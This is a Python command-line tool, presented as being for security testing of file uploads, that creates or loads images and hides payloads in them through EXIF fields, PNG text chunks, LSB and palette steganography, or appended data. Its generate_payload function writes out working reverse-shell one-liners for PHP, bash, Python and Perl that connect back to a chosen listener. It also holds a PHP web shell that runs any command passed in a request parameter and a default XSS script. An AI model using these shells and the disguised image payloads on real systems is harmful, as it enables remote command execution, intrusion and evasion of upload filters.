#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Image Generator & Payload Injector
A tool for security professionals to generate or modify images and embed payloads
for testing file upload vulnerabilities and other security research scenarios.
"""

import argparse
import base64
import os
import random
import string
import sys
import io
import math
from typing import Optional, Dict, Any, List, Generator

# Attempt to import piexif for EXIF manipulation
try:
    import piexif
    import piexif.helper
    PIEXIF_AVAILABLE = True
except ImportError:
    PIEXIF_AVAILABLE = False

# PIL is a hard requirement
try:
    from PIL import Image, ImageDraw, ImageFont, PngImagePlugin
except ImportError:
    sys.stderr.write("[-] Error: Pillow is not installed. Please run 'pip install Pillow'.\n")
    sys.exit(1)

# AI generation requirements
try:
    import requests
except ImportError:
    requests = None
try:
    from gradio_client import Client
except ImportError:
    Client = None

__version__ = "3.2.0"

# --- Constants ---
FONT_PATHS = [
    '/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf',
    '/usr/share/fonts/truetype/freefont/FreeMonoBold.ttf',
    '/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf',
    '/usr/share/fonts/truetype/freefont/FreeMono.ttf'
]
SUPPORTED_SHELL_LANGS = ['php', 'bash', 'python', 'perl']
PAYLOAD_DELIMITER = b'EOFEOF'
CANARY_STRINGS = {
    'exif_artist': 'CANARY_ARTIST_9B1D',
    'exif_user_comment': 'CANARY_USERCOMMENT_C3A5',
    'png_chunk': 'CANARY_PNGCHUNK_E7F2',
    'lsb': 'CANARY_LSB_A4B8',
    'polyglot': 'CANARY_POLYGLOT_F0D6'
}

# --- Utility Functions ---

def log(level: str, message: str) -> None:
    """Helper for consistent, colored console output."""
    colors = {'+': '\033[92m', 'i': '\033[94m', '-': '\033[91m', '!': '\033[93m', 'end': '\033[0m'}
    sys.stdout.write(f"{colors.get(level, '')}[{level}] {message}{colors['end']}\n")

class CustomFormatter(argparse.RawTextHelpFormatter, argparse.ArgumentDefaultsHelpFormatter):
    """Custom argparse formatter."""
    pass

# --- Core Logic & Payload Generation ---

def get_font(size: int) -> ImageFont.FreeTypeFont:
    """Find a suitable system font, falling back to PIL default."""
    for path in FONT_PATHS:
        if os.path.exists(path):
            try:
                return ImageFont.truetype(path, size)
            except IOError: continue
    log('!', "No system fonts found, falling back to default.")
    return ImageFont.load_default()

def generate_payload(payload_type: str, lang: str, lhost: Optional[str], lport: Optional[int], xss_payload: str) -> str:
    """Generates a standard payload based on the selected type."""
    lang = lang.lower()
    if payload_type == 'reverse-shell':
        if not (lhost and lport):
            raise ValueError("--lhost and --lport are required for a reverse-shell.")
        payloads = {
            'php': f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'""",
            'bash': f"""/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'""",
            'python': f"""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""",
            'perl': f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
        }
        if lang not in payloads:
            raise NotImplementedError(f"Reverse shell for '{lang}' is not supported.")
        return payloads[lang]
    elif payload_type == 'webshell':
        payloads = {
            'php': "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>"
        }
        if lang not in payloads:
            raise NotImplementedError(f"Webshell for '{lang}' is not supported. Try 'php'.")
        return payloads[lang]
    elif payload_type == 'xss':
        return xss_payload
    else:
        raise NotImplementedError(f"Payload type '{payload_type}' is not supported.")

# --- Image Creation & Modification ---

def create_image_local(text: str, width: int, height: int, output_format: str) -> Image.Image:
    """Creates a new license plate image in memory."""
    mode = 'RGBA' if output_format.upper() == 'PNG' else 'RGB'
    bg_color = (255, 255, 255, 0) if mode == 'RGBA' else 'white'
    img = Image.new(mode, (width, height), color=bg_color)
    d = ImageDraw.Draw(img)
    font_size = int(height * 0.6)
    font = get_font(font_size)
    try:
        bbox = d.textbbox((0, 0), text, font=font)
        text_width, text_height, offset_y = bbox[2] - bbox[0], bbox[3] - bbox[1], bbox[1]
    except AttributeError:
        text_width, text_height, offset_y = d.textsize(text, font=font)[0], d.textsize(text, font=font)[1], 0
    x = (width - text_width) / 2
    y = ((height - text_height) / 2) - offset_y
    d.text((x, y), text, fill='black', font=font)
    d.rectangle([0, 0, width - 1, height - 1], outline='black', width=2)
    return img

def create_image_stabilityai(prompt: str, api_key: str, width: int, height: int) -> Image.Image:
    """Generates an image using the Stability AI API."""
    if not requests:
        raise ImportError("The 'requests' library is required for Stability AI generation. Please run 'pip install requests'.")
    
    log('i', f"Generating image with Stability AI for prompt: '{prompt}'...")
    url = "https://api.stability.ai/v1/generation/stable-diffusion-v1-6/text-to-image"
    headers = { "Accept": "application/json", "Content-Type": "application/json", "Authorization": f"Bearer {api_key}" }
    body = { "steps": 40, "width": width, "height": height, "seed": 0, "cfg_scale": 5, "samples": 1, "text_prompts": [{"text": prompt, "weight": 1}] }
    response = requests.post(url, headers=headers, json=body)
    if response.status_code != 200:
        raise RuntimeError(f"Stability AI API error ({response.status_code}): {response.text}")
    data = response.json()
    img_data = base64.b64decode(data["artifacts"][0]["base64"])
    return Image.open(io.BytesIO(img_data))

def create_image_huggingface(prompt: str, negative_prompt: str, scale: float) -> Image.Image:
    """Generates an image using the public Hugging Face Stable Diffusion Gradio space."""
    if not Client:
        raise ImportError("The 'gradio_client' library is required for Hugging Face generation. Please run 'pip install gradio_client'.")

    log('i', "Connecting to Hugging Face Gradio client for stabilityai/stable-diffusion...")
    client = Client("stabilityai/stable-diffusion")
    
    log('i', f"Generating image with prompt: '{prompt}'...")
    result = client.predict(prompt=prompt, negative=negative_prompt, scale=scale, api_name="/infer")
    if not result or 'image' not in result[0]:
         raise RuntimeError("Hugging Face API did not return a valid image path.")
    image_path = result[0]['image']
    log('+', f"Image successfully generated and saved to temporary path: {image_path}")
    return Image.open(image_path)


def load_image_from_disk(input_path: str) -> Image.Image:
    """Loads an existing image and validates its magic bytes."""
    with open(input_path, 'rb') as f:
        magic_bytes = f.read(12)
        if not (magic_bytes.startswith(b'\xFF\xD8\xFF') or magic_bytes.startswith(b'\x89PNG\r\n\x1a\n')):
            raise ValueError("Input file is not a valid JPEG or PNG.")
    return Image.open(input_path)

# --- Injection & Extraction Logic ---

def _str_to_bits(data: str) -> list[int]:
    """Convert a string to a list of its bits with a delimiter."""
    byte_data = data.encode('utf-8', 'ignore') + PAYLOAD_DELIMITER
    return [int(bit) for byte in byte_data for bit in f'{byte:08b}']

def _bits_to_str(bits: list[int]) -> str:
    """Convert a list of bits back to a string, stopping at the delimiter."""
    byte_list = []
    for i in range(0, len(bits) - 7, 8):
        byte = ''.join(map(str, bits[i:i+8]))
        byte_list.append(int(byte, 2))
    
    try:
        data = bytes(byte_list)
        delimiter_pos = data.find(PAYLOAD_DELIMITER)
        if delimiter_pos != -1:
            return data[:delimiter_pos].decode('utf-8', 'ignore')
    except Exception:
        return ""
    return ""

def hide_data_lsb(img: Image.Image, payload: str) -> Image.Image:
    """Hides payload data in the least significant bits of image pixels."""
    log('i', "Hiding data using LSB steganography...")
    img = img.convert('RGB')
    bits_to_hide = _str_to_bits(payload)
    num_bits = len(bits_to_hide)
    width, height = img.size
    if num_bits > width * height * 3:
        raise ValueError(f"Payload is too large for LSB in this image.")
    pixels, bit_index = img.load(), 0
    for y in range(height):
        for x in range(width):
            if bit_index >= num_bits: break
            pixel = list(pixels[x, y])
            for i in range(3):
                if bit_index < num_bits:
                    pixel[i] = (pixel[i] & ~1) | bits_to_hide[bit_index]
                    bit_index += 1
            pixels[x, y] = tuple(pixel)
        if bit_index >= num_bits: break
    log('+', f"Embedded {len(payload.encode())} bytes via LSB.")
    return img

def _get_lsb_bit_stream(img: Image.Image) -> Generator[int, None, None]:
    """A generator that yields the LSB of each color channel in an image."""
    img = img.convert('RGB')
    pixels = img.getdata()
    for pixel in pixels:
        yield pixel[0] & 1
        yield pixel[1] & 1
        yield pixel[2] & 1

def extract_data_lsb(img: Image.Image) -> str:
    """Extracts data from the LSB of image pixels efficiently."""
    bit_stream = _get_lsb_bit_stream(img)
    byte_buffer = bytearray()
    
    current_bits = []
    while True:
        try:
            current_bits.append(next(bit_stream))
            if len(current_bits) == 8:
                byte_val = int("".join(map(str, current_bits)), 2)
                byte_buffer.append(byte_val)
                current_bits = []
                
                if byte_buffer.endswith(PAYLOAD_DELIMITER):
                    return byte_buffer[:-len(PAYLOAD_DELIMITER)].decode('utf-8', 'ignore')
        except StopIteration:
            return ""

def hide_data_palette(img: Image.Image, payload: str) -> Image.Image:
    """Hides payload data in the LSBs of an image's color palette."""
    log('i', "Hiding data using palette-based steganography...")
    if img.mode != 'P':
        log('!', "Image is not in indexed-color mode. Quantizing to 'P' mode.")
        img = img.quantize(colors=256, method=Image.Quantize.MEDIANCUT)

    palette_data = img.getpalette()
    if not palette_data:
        raise ValueError("Could not get a color palette from the image.")

    bits_to_hide = _str_to_bits(payload)
    if len(bits_to_hide) > len(palette_data):
        raise ValueError(f"Payload is too large for the palette. Max: {len(palette_data) // 8} bytes.")

    for i, bit in enumerate(bits_to_hide):
        palette_data[i] = (palette_data[i] & ~1) | bit
    img.putpalette(palette_data)
    log('+', f"Embedded {len(payload.encode())} bytes into the color palette.")
    return img

def extract_data_palette(img: Image.Image) -> str:
    """Extracts data from an image's color palette."""
    if img.mode != 'P':
        return ""
    palette_data = img.getpalette()
    if not palette_data:
        return ""
    extracted_bits = [val & 1 for val in palette_data]
    return _bits_to_str(extracted_bits)

def extract_data_png_chunk(img: Image.Image) -> str:
    """Extracts data from a custom PNG tEXt chunk."""
    return img.text.get("Payload", "")

def extract_data_exif_usercomment(img: Image.Image) -> str:
    """Extracts data from the EXIF UserComment tag."""
    if not PIEXIF_AVAILABLE or 'exif' not in img.info:
        return ""
    try:
        exif_dict = piexif.load(img.info['exif'])
        user_comment = exif_dict.get("Exif", {}).get(piexif.ExifIFD.UserComment, b'')
        return piexif.helper.UserComment.load(user_comment)
    except Exception:
        return ""

def extract_data_polyglot(filepath: str) -> str:
    """Extracts data appended to a file."""
    with open(filepath, 'rb') as f:
        content = f.read()
    eoi_marker = content.rfind(b'\xff\xd9')
    if eoi_marker != -1:
        appended_data = content[eoi_marker+2:]
        try:
            return appended_data.strip().decode('utf-8', 'ignore')
        except UnicodeDecodeError:
            return ""
    return ""

def set_custom_exif(exif_dict: Dict[str, Any], tags: List[str]) -> Dict[str, Any]:
    """Parses and sets custom EXIF tags."""
    if not PIEXIF_AVAILABLE:
        log('!', "piexif not found, cannot set custom EXIF tags.")
        return exif_dict
    
    TAG_MAP = {
        'Image.Artist': piexif.ImageIFD.Artist,
        'Image.Make': piexif.ImageIFD.Make,
        'Image.Model': piexif.ImageIFD.Model,
        'Image.Software': piexif.ImageIFD.Software
    }
    for tag_str in tags:
        if '=' not in tag_str:
            log('!', f"Skipping malformed EXIF tag '{tag_str}'. Use format 'Key=Value'.")
            continue
        key, value = tag_str.split('=', 1)
        if key in TAG_MAP:
            tag_const = TAG_MAP[key]
            ifd = "0th" if tag_const in piexif.ImageIFD.__dict__.values() else "Exif"
            exif_dict[ifd][tag_const] = value.encode('utf-8')
            log('i', f"Set custom EXIF tag {key} = {value}")
        else:
            log('!', f"Skipping unsupported EXIF tag '{key}'.")
    return exif_dict

# --- Saving & Main Feature Logic ---

def save_image(img: Image.Image, output_path: str, args: argparse.Namespace, payload: Optional[str]) -> None:
    """Injects payload and saves the image based on provided arguments."""
    save_kwargs: Dict[str, Any] = {}
    png_info = PngImagePlugin.PngInfo()
    output_format = os.path.splitext(output_path)[1][1:].upper() or "JPEG"
    
    if hasattr(args, 'fuzz') and args.fuzz:
        valid_methods = ['exif', 'polyglot', 'lsb']
        if output_format == 'PNG':
            valid_methods.extend(['png-chunk', 'palette-stego'])
        
        args.injection_method = random.choice(valid_methods)
        args.encode = random.choice([None, 'base64'])
        args.strip_exif = random.choice([True, False])
        log('i', f"Fuzz mode chose: method='{args.injection_method}', encode='{args.encode}', strip_exif={args.strip_exif}")
        if args.encode == 'base64' and payload:
            payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')

    if payload:
        if args.injection_method == 'lsb':
            img = hide_data_lsb(img, payload)
        elif args.injection_method == 'palette-stego':
            img = hide_data_palette(img, payload)
        elif args.injection_method == 'png-chunk':
            if output_format != 'PNG': raise ValueError("PNG chunk injection only works on PNG files.")
            png_info.add_text("Payload", payload, zip=False)
            log('i', "Added payload to a tEXt chunk in PNG.")

    exif_dict = {"0th": {}, "Exif": {}, "1st": {}, "thumbnail": None, "GPS": {}}
    if not (hasattr(args, 'strip_exif') and args.strip_exif) and img.info.get('exif'):
        try:
            exif_dict = piexif.load(img.info['exif'])
        except Exception:
            log('!', "Could not load pre-existing EXIF data. Starting fresh.")
    
    if hasattr(args, 'set_exif') and args.set_exif:
        exif_dict = set_custom_exif(exif_dict, args.set_exif)

    if PIEXIF_AVAILABLE and payload and args.injection_method == 'exif':
        exif_dict["Exif"][piexif.ExifIFD.UserComment] = piexif.helper.UserComment.dump(payload, encoding="unicode")
        log('i', "Injected payload into EXIF UserComment field.")
    
    if any(exif_dict.values()):
        try:
            cleaned_exif = {k: v for k, v in exif_dict.items() if v}
            save_kwargs['exif'] = piexif.dump(cleaned_exif)
        except Exception as e:
            log('-', f"Failed to dump EXIF data: {e}")

    if output_format == 'PNG':
        save_kwargs['pnginfo'] = png_info
    if output_format == "JPEG" and img.mode in ('RGBA', 'P'):
        img = img.convert('RGB')

    img.save(output_path, format=output_format, **save_kwargs)

    if payload and args.injection_method == 'polyglot':
        with open(output_path, 'ab') as f:
            f.write(f"\n{payload}".encode('utf-8', 'ignore'))
        log('i', "Appended payload to create polyglot file.")

def analyze_durability(args: argparse.Namespace, payload: str):
    """Simulates server-side processing to test payload survival."""
    log('i', f"--- Starting Durability Analysis for method '{args.injection_method}' ---")
    
    if args.generate:
        output_format = os.path.splitext(args.output)[1][1:] if args.output else 'PNG'
        plate_text = args.text or ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
        img = create_image_local(plate_text, args.width, args.height, output_format)
    else:
        img = load_image_from_disk(args.input)

    temp_img = img.copy()
    
    if args.injection_method == 'polyglot':
        log('!', "Durability analysis for 'polyglot' is not practical. Server processing will almost certainly strip appended data.")
        return

    dummy_path = f"dummy.{'png' if 'png' in args.injection_method else 'jpg'}"
    save_image(temp_img, dummy_path, args, payload)
    
    buffer = io.BytesIO()
    save_format = 'PNG' if temp_img.mode == 'RGBA' else 'JPEG'
    temp_img.save(buffer, format=save_format) 
    buffer.seek(0)
    injected_img = Image.open(buffer)

    processed_img = injected_img.copy()
    if args.jpeg_quality:
        log('i', f"Simulating re-save with JPEG quality {args.jpeg_quality}%...")
        buffer = io.BytesIO()
        processed_img.convert('RGB').save(buffer, format='JPEG', quality=args.jpeg_quality)
        buffer.seek(0)
        processed_img = Image.open(buffer)
    
    if args.resize:
        w, h = map(int, args.resize.split('x'))
        log('i', f"Simulating resize to {w}x{h}...")
        processed_img = processed_img.resize((w, h), Image.Resampling.LANCZOS)
    
    extracted_payload = ""
    log('i', "Attempting to extract payload from processed image...")
    if args.injection_method == 'lsb':
        extracted_payload = extract_data_lsb(processed_img)
    elif args.injection_method == 'palette-stego':
        extracted_payload = extract_data_palette(processed_img)
    elif args.injection_method == 'png-chunk':
        extracted_payload = extract_data_png_chunk(processed_img)
    elif args.injection_method == 'exif':
        extracted_payload = extract_data_exif_usercomment(processed_img)

    log('i', f"Original Payload Length: {len(payload)}")
    log('i', f"Extracted Payload Length: {len(extracted_payload)}")
    
    if extracted_payload == payload: log('+', "RESULT: Payload SURVIVED intact.")
    elif extracted_payload: log('!', "RESULT: Payload CORRUPTED.")
    else: log('-', "RESULT: Payload DESTROYED.")
    log('i', "--- Analysis Complete ---")

def generate_canary_image(args: argparse.Namespace):
    """Generates an image with known data points for workflow verification."""
    log('i', "--- Generating Canary Image ---")
    img_format = os.path.splitext(args.output)[1][1:].upper()
    if not img_format:
        raise ValueError("Output file must have an extension (e.g., .png, .jpg).")
    img = create_image_local("CANARY", args.width, args.height, img_format)
    img = hide_data_lsb(img.copy(), CANARY_STRINGS['lsb'])
    exif_dict = {"0th": {}, "Exif": {}}
    exif_dict["0th"][piexif.ImageIFD.Artist] = CANARY_STRINGS['exif_artist'].encode('utf-8')
    exif_dict["Exif"][piexif.ExifIFD.UserComment] = piexif.helper.UserComment.dump(CANARY_STRINGS['exif_user_comment'], encoding="unicode")
    png_info = PngImagePlugin.PngInfo()
    if img_format == 'PNG':
        png_info.add_text("Payload", CANARY_STRINGS['png_chunk'], zip=False)
    save_kwargs = {}
    if PIEXIF_AVAILABLE:
        save_kwargs['exif'] = piexif.dump(exif_dict)
    if img_format == 'PNG':
        save_kwargs['pnginfo'] = png_info
    img.save(args.output, format=img_format, **save_kwargs)
    with open(args.output, 'ab') as f:
        f.write(f"\n{CANARY_STRINGS['polyglot']}".encode())
    log('+', f"Canary image saved to '{args.output}'. Upload it, then run --verify-workflow.")

def verify_workflow(args: argparse.Namespace):
    """Analyzes a downloaded image for canary data points."""
    log('i', f"--- Verifying Workflow for '{args.input}' ---")
    try:
        img = load_image_from_disk(args.input)
    except Exception as e:
        log('-', f"Could not load image: {e}")
        return
    report = []
    expected_w, expected_h = args.canary_orig_dims.split('x')
    actual_w, actual_h = img.size
    if f"{actual_w}x{actual_h}" == args.canary_orig_dims: report.append(f"[+] Dimensions: SURVIVED ({actual_w}x{actual_h})")
    else: report.append(f"[!] Dimensions: ALTERED (Expected {expected_w}x{expected_h}, got {actual_w}x{actual_h})")
    exif_artist = ""
    if PIEXIF_AVAILABLE and 'exif' in img.info:
        try:
            exif_dict = piexif.load(img.info['exif'])
            exif_artist = exif_dict.get("0th", {}).get(piexif.ImageIFD.Artist, b'').decode('utf-8', 'ignore')
        except Exception: pass
    if exif_artist == CANARY_STRINGS['exif_artist']: report.append(f"[+] EXIF Artist: SURVIVED")
    elif exif_artist: report.append(f"[!] EXIF Artist: CORRUPTED (Found: {exif_artist[:30]}...)")
    else: report.append(f"[-] EXIF Artist: STRIPPED")
    exif_comment = extract_data_exif_usercomment(img)
    if exif_comment == CANARY_STRINGS['exif_user_comment']: report.append(f"[+] EXIF UserComment: SURVIVED")
    elif exif_comment: report.append(f"[!] EXIF UserComment: CORRUPTED (Found: {exif_comment[:30]}...)")
    else: report.append(f"[-] EXIF UserComment: STRIPPED")
    png_chunk = extract_data_png_chunk(img)
    if png_chunk == CANARY_STRINGS['png_chunk']: report.append(f"[+] PNG 'Payload' Chunk: SURVIVED")
    elif png_chunk: report.append(f"[!] PNG 'Payload' Chunk: CORRUPTED (Found: {png_chunk[:30]}...)")
    else: report.append(f"[-] PNG 'Payload' Chunk: STRIPPED")
    lsb_data = extract_data_lsb(img)
    if lsb_data == CANARY_STRINGS['lsb']: report.append(f"[+] LSB Data: SURVIVED")
    elif lsb_data: report.append(f"[!] LSB Data: CORRUPTED (Found: {lsb_data[:30]}...)")
    else: report.append(f"[-] LSB Data: DESTROYED")
    poly_data = extract_data_polyglot(args.input)
    if poly_data == CANARY_STRINGS['polyglot']: report.append(f"[+] Polyglot Data: SURVIVED")
    elif poly_data: report.append(f"[!] Polyglot Data: CORRUPTED (Found: {poly_data[:30]}...)")
    else: report.append(f"[-] Polyglot Data: STRIPPED")
    print("\n" + "="*20 + " WORKFLOW REPORT " + "="*20)
    for line in report:
        if line.startswith('[+]'): log('+', line[4:])
        elif line.startswith('[!]'): log('!', line[4:])
        elif line.startswith('[-]'): log('-', line[4:])
    print("="*57 + "\n")

def analyze_capacity(args: argparse.Namespace):
    """Analyzes an image to determine its maximum payload capacity for various methods."""
    log('i', f"--- Analyzing Steganographic Capacity for '{args.input}' ---")
    img = load_image_from_disk(args.input)
    width, height = img.size
    
    lsb_bits = width * height * 3
    lsb_bytes = (lsb_bits // 8) - len(PAYLOAD_DELIMITER)
    log('+', f"LSB (RGB): {lsb_bytes:,} bytes")

    try:
        quantized_img = img.quantize(colors=256)
        palette = quantized_img.getpalette()
        if palette:
            palette_bytes = (len(palette) // 8) - len(PAYLOAD_DELIMITER)
            log('+', f"Palette (256 color): {palette_bytes:,} bytes")
        else:
            log('!', "Palette: Not applicable (no palette found after quantizing).")
    except Exception:
        log('!', "Palette: Not applicable (image could not be quantized).")

    log('i', "EXIF / PNG Chunk / Polyglot: Capacity is not pixel-dependent (effectively filesystem limited).")
    log('i', "--- Analysis Complete ---")

def split_payload(args: argparse.Namespace, payload: str):
    """Splits a payload across multiple images in a directory."""
    log('i', f"--- Splitting Payload Across Multiple Images ---")
    
    try:
        carrier_files = sorted([f for f in os.listdir(args.input_dir) if os.path.isfile(os.path.join(args.input_dir, f))])
        if not carrier_files: raise FileNotFoundError
    except FileNotFoundError:
        raise FileNotFoundError(f"Input directory '{args.input_dir}' not found or is empty.")
    
    num_carriers = len(carrier_files)
    log('i', f"Found {num_carriers} carrier images in '{args.input_dir}'.")
    
    payload_bytes = payload.encode('utf-8')
    chunk_size = math.ceil(len(payload_bytes) / num_carriers)
    chunks = [payload_bytes[i:i + chunk_size] for i in range(0, len(payload_bytes), chunk_size)]
    
    log('i', f"Payload of {len(payload_bytes)} bytes split into {len(chunks)} chunks of max size {chunk_size} bytes.")

    os.makedirs(args.output_dir, exist_ok=True)
    for i, filename in enumerate(carrier_files):
        if i >= len(chunks):
            log('!', f"Warning: More images than chunks. '{filename}' will not be used.")
            continue
            
        in_path = os.path.join(args.input_dir, filename)
        
        base, ext = os.path.splitext(filename)
        out_path = os.path.join(args.output_dir, f"{base}_chunk_{i+1:03d}{ext}")
        
        try:
            log('i', f"Processing '{filename}' -> '{os.path.basename(out_path)}'...")
            img = load_image_from_disk(in_path)
            chunk_payload = chunks[i].decode('utf-8', 'ignore')
            save_image(img, out_path, args, chunk_payload)
            log('+', f"Successfully embedded chunk {i+1} into '{out_path}'.")
        except Exception as e:
            log('-', f"Failed to process '{filename}': {e}")
            
    log('+', "Payload splitting complete.")
    log('i', "To reassemble, concatenate the extracted data from the chunks in numerical order.")

def resolve_payload(args: argparse.Namespace) -> Optional[str]:
    """Determines the payload content from command-line arguments."""
    if hasattr(args, 'fuzz') and args.fuzz and args.encode:
        log('!', "Fuzz mode is active; ignoring explicit --encode flag as it will be randomized.")
    payload_content = None
    if args.generate_payload:
        payload_content = generate_payload(args.generate_payload, args.shell_lang, args.lhost, args.lport, args.xss_string)
    elif args.payload_file:
        try:
            with open(args.payload_file, 'r', encoding='utf-8') as f: payload_content = f.read()
        except FileNotFoundError: raise FileNotFoundError(f"Payload file not found at '{args.payload_file}'")
    elif args.payload:
        payload_content = args.payload
    if payload_content and hasattr(args, 'encode') and args.encode and not (hasattr(args, 'fuzz') and args.fuzz):
        if args.encode == 'base64':
            log('i', "Encoding payload with base64.")
            return base64.b64encode(payload_content.encode('utf-8')).decode('utf-8')
    return payload_content

def setup_arg_parser() -> argparse.ArgumentParser:
    """Configures and returns the argument parser."""
    parser = argparse.ArgumentParser(
        description="A tool for embedding payloads in images for security testing.",
        formatter_class=CustomFormatter,
        epilog="""
Examples:
  # Generate an image with Hugging Face and inject a webshell
  ./%(prog)s --generate --gen-engine huggingface -t "A photo of a Corgi in a superhero cape" \\
    --output hf_corgi.png --generate-payload webshell --injection-method lsb

  # Analyze the max LSB payload size for an image
  ./%(prog)s --analyze-capacity --input photo.png

  # Split a large payload file across all images in a directory
  ./%(prog)s --split-payload --input-dir ./carriers/ --output-dir ./chunks/ \\
    --payload-file large.bin --injection-method lsb
    
  # Test if an LSB payload survives 80% JPEG compression and a resize
  ./%(prog)s --analyze-durability --input photo.png --payload "secret" --injection-method lsb \\
    --jpeg-quality 80 --resize 800x600

  # 1. Generate a canary image for workflow verification
  ./%(prog)s --generate-canary --output canary.png -W 400 -H 200

  # 2. Upload canary.png to a server, download it as 'processed.png', then verify
  ./%(prog)s --verify-workflow --input processed.png --canary-orig-dims 400x200
""")
    parser.add_argument('-v', '--version', action='version', version=f'%(prog)s {__version__}')
    
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument("--input", help="Path to a single image to modify (standard mode).")
    mode_group.add_argument("--generate", action='store_true', help="Generate a new image.")
    mode_group.add_argument("--analyze-durability", action='store_true', help="Analyze if a payload survives image processing.")
    mode_group.add_argument("--analyze-capacity", action='store_true', help="Analyze max payload capacity of an image.")
    mode_group.add_argument("--split-payload", action='store_true', help="Split payload across multiple images in a directory.")
    mode_group.add_argument("--generate-canary", action='store_true', help="Generate a workflow verification image.")
    mode_group.add_argument("--verify-workflow", action='store_true', help="Verify a downloaded canary image.")
    
    io_group = parser.add_argument_group('input/output options')
    io_group.add_argument("--input-dir", help="Directory of images to process (for --split-payload).")
    io_group.add_argument("--output", help="Path to save the output image.")
    io_group.add_argument("--output-dir", help="Directory to save processed images (for --split-payload).")

    gen_group = parser.add_argument_group('generation options')
    gen_group.add_argument("--gen-engine", choices=['local', 'stabilityai', 'huggingface'], default='local', help="The engine to use for image generation.")
    gen_group.add_argument("-t", "--text", default=None, help="Text for local generation, or prompt for AI.")
    gen_group.add_argument("-W", "--width", type=int, default=512, help="Image width.")
    gen_group.add_argument("-H", "--height", type=int, default=512, help="Image height.")
    
    ai_group = parser.add_argument_group('AI generation options')
    ai_group.add_argument("--stability-api-key", help="API key for Stability AI. Can also be set via STABILITY_API_KEY env var.")
    ai_group.add_argument("--negative-prompt", default="", help="Negative prompt for Hugging Face engine.")
    ai_group.add_argument("--guidance-scale", type=float, default=9.0, help="Guidance scale for Hugging Face engine.")


    payload_group = parser.add_argument_group('payload options')
    payload_src_group = payload_group.add_mutually_exclusive_group()
    payload_src_group.add_argument("--payload", help="Payload string to inject.")
    payload_src_group.add_argument("--payload-file", help="File containing the payload to inject.")
    payload_src_group.add_argument("--generate-payload", choices=['reverse-shell', 'webshell', 'xss'], help="Generate a standard payload.")

    config_group = parser.add_argument_group('payload configuration')
    config_group.add_argument("--injection-method", choices=['exif', 'polyglot', 'lsb', 'png-chunk', 'palette-stego'], help="Payload injection method.")
    config_group.add_argument("--encode", choices=['base64'], help="Encode the final payload before injection.")
    config_group.add_argument("--strip-exif", action='store_true', help="Strip pre-existing EXIF data.")
    config_group.add_argument("--set-exif", action='append', help="Set a custom EXIF tag (e.g., 'Image.Make=MyValue').")
    config_group.add_argument("--fuzz", action='store_true', help="Apply a random combination of injection techniques.")
    
    revshell_group = parser.add_argument_group('reverse-shell & xss options')
    revshell_group.add_argument("--lhost", help="Listener IP for reverse shell.")
    revshell_group.add_argument("--lport", type=int, help="Listener port for reverse shell.")
    revshell_group.add_argument("--shell-lang", choices=SUPPORTED_SHELL_LANGS, default='php', help="Language for reverse shell/webshell.")
    revshell_group.add_argument("--xss-string", default='<script>alert("XSS")</script>', help="Custom JavaScript for XSS payload.")

    analysis_group = parser.add_argument_group('durability & verification options')
    analysis_group.add_argument("--jpeg-quality", type=int, metavar='<1-100>', help="Simulate JPEG quality (for --analyze-durability).")
    analysis_group.add_argument("--resize", type=str, metavar='<WxH>', help="Simulate resizing (e.g., '800x600') (for --analyze-durability).")
    analysis_group.add_argument("--canary-orig-dims", type=str, metavar='<WxH>', help="Original dims of canary image (for --verify-workflow).")

    return parser

def main():
    """Main execution flow."""
    parser = setup_arg_parser()
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    try:
        payload = resolve_payload(args)

        if args.analyze_durability:
            if not (args.jpeg_quality or args.resize): parser.error("--analyze-durability requires --jpeg-quality or --resize.")
            if not payload: parser.error("--analyze-durability requires a payload.")
            if not args.injection_method: parser.error("--analyze-durability requires --injection-method.")
            if not (args.generate or args.input): parser.error("--analyze-durability requires a base image from --generate or --input.")
            analyze_durability(args, payload)

        elif args.analyze_capacity:
            if not args.input: parser.error("--analyze-capacity requires --input.")
            analyze_capacity(args)
            
        elif args.split_payload:
            if not args.input_dir or not args.output_dir: parser.error("--split-payload requires --input-dir and --output-dir.")
            if not payload: parser.error("--split-payload requires a payload.")
            if not args.injection_method: parser.error("--split-payload requires --injection-method.")
            split_payload(args, payload)

        elif args.generate_canary:
            if not args.output: parser.error("--generate-canary requires --output.")
            generate_canary_image(args)

        elif args.verify_workflow:
            if not args.input: parser.error("--verify-workflow requires --input.")
            if not args.canary_orig_dims: parser.error("--verify-workflow requires --canary-orig-dims.")
            verify_workflow(args)

        elif args.generate:
            if not args.output: parser.error("--output is required for --generate.")
            prompt = args.text or "a white license plate with random numbers"
            if args.gen_engine == 'stabilityai':
                api_key = args.stability_api_key or os.getenv('STABILITY_API_KEY')
                if not api_key: parser.error("Stability AI API key must be provided via --stability-api-key or STABILITY_API_KEY env var.")
                img = create_image_stabilityai(prompt, api_key, args.width, args.height)
            elif args.gen_engine == 'huggingface':
                img = create_image_huggingface(prompt, args.negative_prompt, args.guidance_scale)
            else: # local
                output_format = os.path.splitext(args.output)[1][1:]
                img = create_image_local(prompt, args.width, args.height, output_format)
            log('+', f"Generated new image using {args.gen_engine} engine.")
            save_image(img, args.output, args, payload)
            log('+', f"Successfully saved output to {args.output}")

        elif args.input:
            if not args.output: parser.error("--output is required for single image operations.")
            img = load_image_from_disk(args.input)
            log('+', f"Loaded existing image: {args.input}")
            save_image(img, args.output, args, payload)
            log('+', f"Successfully saved output to {args.output}")
